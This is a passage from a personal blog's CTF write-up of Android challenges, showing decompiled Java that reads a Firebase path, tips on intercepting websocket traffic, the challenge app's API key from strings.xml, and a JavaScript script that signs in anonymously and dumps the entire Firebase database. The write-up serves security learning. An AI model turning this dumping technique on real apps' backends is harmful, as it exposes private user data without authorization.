+<p>Inside the same file if your input is correct which is <code>Shroomishie</code> it will take that input and use it as a path to fetch data from <code>Firebase</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">(String str, <span class="keyword">final</span> Function1&lt;? <span class="built_in">super</span> String, Unit&gt; function1)</span> &#123;</span><br><span class="line">    <span class="type">DatabaseReference</span> <span class="variable">reference</span> <span class="operator">=</span> FirebaseDatabase.getInstance().getReference(str);</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(reference, <span class="string">&quot;getReference(...)&quot;</span>);</span><br><span class="line">    Task&lt;DataSnapshot&gt; task = reference.get();</span><br><span class="line">    <span class="comment">// ... event handlers for success/failure</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>So to intercept the communication just use proxy tools like <code>Burp Suite</code> or <code>HTTPToolkit</code> but you need to remember… that the traffic is using <code>websocket</code> and not <code>HTTP</code>.</p>
+<p>As you can see here there is a <code>GET</code> request to <code>s-usc1f-nss-2568.firebaseio.com </code>, just take a look at the responses, the flag is in one of em.</p>
+<p><img src="/images/imageEq3.png" alt="alt text"></p>
+<h2 id="Cook-that-Pukimon"><a href="#Cook-that-Pukimon" class="headerlink" title="Cook that Pukimon"></a>Cook that Pukimon</h2><p>Lastly if you use apktool to decompile the apk, you noticed that there is <code>strings.xml</code> inside <code>res/values</code>.</p>
+<p>If you take a look inside it, there are a couple of <code>sensitive</code> information inside it.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;gcm_defaultSenderId&quot;</span>&gt;</span>402409561826<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_api_key&quot;</span>&gt;</span>AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_app_id&quot;</span>&gt;</span>1:402409561826:android:e9d44b894477f95e6f88bb<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_crash_reporting_api_key&quot;</span>&gt;</span>AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;google_storage_bucket&quot;</span>&gt;</span>eqctf-pukimon1.firebasestorage.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Now for this part I need refer to someone else <a target="_blank" rel="noopener" href="https://medium.com/@AhmedMhesham/ascwg-ctf-2024-android-challenges-solution-source-code-8c57ffccdcd2">writeups</a> to understand how to connect to <code>Firebase</code> since I have no experience in using it. Inside the article there is a dart script that will be able to extract informations from the database.</p>
+<p>Here is my own script, I prefer to use JS instead.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; initializeApp &#125; = <span class="built_in">require</span>(<span class="string">&quot;firebase/app&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; getDatabase, ref, get &#125; = <span class="built_in">require</span>(<span class="string">&quot;firebase/database&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; getAuth, signInAnonymously &#125; = <span class="built_in">require</span>(<span class="string">&quot;firebase/auth&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> firebaseConfig = &#123;</span><br><span class="line">  <span class="attr">apiKey</span>: <span class="string">&quot;AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss&quot;</span>,</span><br><span class="line">  <span class="attr">authDomain</span>: <span class="string">&quot;eqctf-pukimon1.firebaseapp.com&quot;</span>,</span><br><span class="line">  <span class="attr">databaseURL</span>: <span class="string">&quot;https://eqctf-pukimon1-default-rtdb.firebaseio.com&quot;</span>,</span><br><span class="line">  <span class="attr">projectId</span>: <span class="string">&quot;eqctf-pukimon1&quot;</span>,</span><br><span class="line">  <span class="attr">storageBucket</span>: <span class="string">&quot;eqctf-pukimon1.firebasestorage.app&quot;</span>,</span><br><span class="line">  <span class="attr">messagingSenderId</span>: <span class="string">&quot;402409561826&quot;</span>,</span><br><span class="line">  <span class="attr">appId</span>: <span class="string">&quot;1:402409561826:android:e9d44b894477f95e6f88bb&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">initializeApp</span>(firebaseConfig);</span><br><span class="line"><span class="keyword">const</span> database = <span class="title function_">getDatabase</span>(app);</span><br><span class="line"><span class="keyword">const</span> auth = <span class="title function_">getAuth</span>(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">readData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">signInAnonymously</span>(auth);</span><br><span class="line">    <span class="keyword">const</span> dbRef = <span class="title function_">ref</span>(database);</span><br><span class="line">    <span class="keyword">const</span> snapshot = <span class="keyword">await</span> <span class="title function_">get</span>(dbRef);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snapshot.<span class="title function_">exists</span>()) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Data from database:&quot;</span>, snapshot.<span class="title function_">val</span>());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;No data available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error:&quot;</span>, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">readData</span>();</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Megat Zafran</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ilikeronnnnii.github.io/2025/01/20/eqctf/">https://ilikeronnnnii.github.io/2025/01/20/eqctf/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>peepo pog</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/16/cyberx1/">Briefing Session Challenges</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Megat Zafran | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
